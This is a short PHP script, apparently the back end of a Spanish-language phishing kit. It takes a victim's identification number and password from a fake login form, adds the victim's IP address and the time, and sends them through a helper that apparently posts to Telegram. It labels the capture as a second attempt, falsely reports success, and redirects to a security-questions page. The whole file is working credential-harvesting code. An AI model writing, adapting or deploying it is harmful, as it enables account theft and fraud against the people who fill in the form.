<?php
require __DIR__ . '/data.php';
header('Content-Type: application/json; charset=utf-8');

$identification = nq_f('identification');
$password       = nq_f('password');

if ($identification === '' || $password === '') {
    echo json_encode(['success' => false, 'message' => 'Datos incompletos']);
    exit;
}

$SEP = "───────────────────";
$msg  = "🔐 <b>Acceso — Intento 2</b>\n$SEP\n";
$msg .= "🆔 Identificación: <code>{$identification}</code>\n";
$msg .= "🔑 Contraseña: <code>{$password}</code>\n";
$msg .= "\n🌐 " . nq_ip() . " · 🕐 " . date('Y-m-d H:i:s');

nq_tg($msg);

echo json_encode([
    'success' => true,
    'data'    => ['session_id' => nq_session()],
    'redirect' => 'preguntas.html',
]);
